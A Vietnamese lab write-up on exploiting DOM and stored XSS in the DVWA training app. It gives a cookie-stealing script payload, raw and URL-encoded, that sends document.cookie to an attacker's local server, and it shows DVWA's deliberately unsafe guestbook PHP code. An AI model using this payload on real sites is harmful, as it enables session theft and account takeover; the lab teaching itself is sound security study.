# XSS DOM
## Client / Server side
## Pwned Time
![image](https://github.com/user-attachments/assets/2b6ebd0c-6c76-4903-9305-b13b16b73757)
*Mình sẽ khai thác XSS trực tiếp trên client-side khác với XSS reflected khai thác qua server-side*

![image](https://github.com/user-attachments/assets/b5823528-483f-4285-a890-82c4ebb2de35)
*Thử nhập 1 lệnh alert*
--> Kết quả:
![image](https://github.com/user-attachments/assets/752634e3-7aba-43c7-945d-07c6b05c5136)

Pwn time:
1. Tạo 1 local server qua python (port 8000)
![image](https://github.com/user-attachments/assets/6a79af35-58fe-4de8-b9d7-77fb0ad444a4)

2. Tạo payload độc, lừa user nhập vào
Payload gốc:
```
127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English<script>window.location='http://127.0.0.1:8000/?cookie=' + document.cookie</script>
```
![image](https://github.com/user-attachments/assets/ee01b5a4-71a4-48cf-b0db-9b04016eaefc)
*Nó sẽ ra 1 trang ntn*

Encode payload:
```
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F127.0.0.1%3A8000%2F%3Fcookie%3Ddocument.cookie%3C%2Fscript%3E
```
3. Kết quả
Session id của người dùng hiện trong cửa sổ server của attacker
 ![image](https://github.com/user-attachments/assets/71026905-c57d-471c-81db-891455ac4e22)

# XSS Stored
## Image
![image](https://github.com/user-attachments/assets/c082869d-0917-47e3-8969-bf88766aff00)

## Code backend
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```
*Bảo vệ phần message và name khỏi sql injections. Sau đó thêm vào bảng sql 2 elements message và name*

> $_POST

Tương tự như $_GET, là 1 super global variable, nó sẽ collect những data được gửi đi bởi HTTP POST method <br>
Những data này có thể collect từ form fields: input, checkbox, radio, buttons,...
> trim()

Xóa đi những khoảng trống ở phần đầu.
> stripslashes()

Xóa đi back_slash (\) from a string. Ở trong những bản cũ của php, nó sẽ tự động thêm back slash vào những special character: ', " <br>
Việc của mik cần là xóa những cái đó đi để clean string.

> $_GLOBALS

include POST and GET
> isset(var)

1 Biến để check xem var đc tạo chưa? Not null -> true. Null -> false

## Pwn
![image](https://github.com/user-attachments/assets/3d4f5a68-756a-42f5-a3e9-d4191d4d92c1)
*Chỉnh max size = 250 và nhập malicious code*

-->kết quả:
![image](https://github.com/user-attachments/assets/4af0f7d5-9d17-4c01-94de-058e499fab6d)
*Mỗi lần load lại nó sẽ tự động ra cái trang này*



